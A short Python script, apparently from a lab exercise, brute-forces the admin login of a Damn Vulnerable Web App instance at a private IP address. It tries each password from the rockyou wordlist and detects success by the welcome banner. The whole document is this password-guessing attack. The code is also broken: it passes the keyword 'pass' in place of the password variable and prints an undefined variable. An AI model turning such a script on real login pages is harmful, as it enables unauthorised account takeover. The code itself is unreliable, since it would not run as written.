import os
import requests

f = open("rockyou.txt.txt", "r", encoding="UTF-8")
login = "http://192.168.62.10/dvwa/login.php"
index = "http://192.168.62.10/dvwa/index.php"

for password in f.readlines():
    password = password.strip('\n')
    payload = {'username': "admin",'password': pass,'Login': 'Login'}

    requete = requests.session()
    requete.post(login, data=payload)
    reponse = requete.get(index)

    if "<h1>Welcome to Damn Vulnerable Web App!</h1>"  in reponse.text:
        print("mot de passe cassé." + str(mot_de_passe))
        exit()
    else:
        print("\n mot de passe incorrect: ")
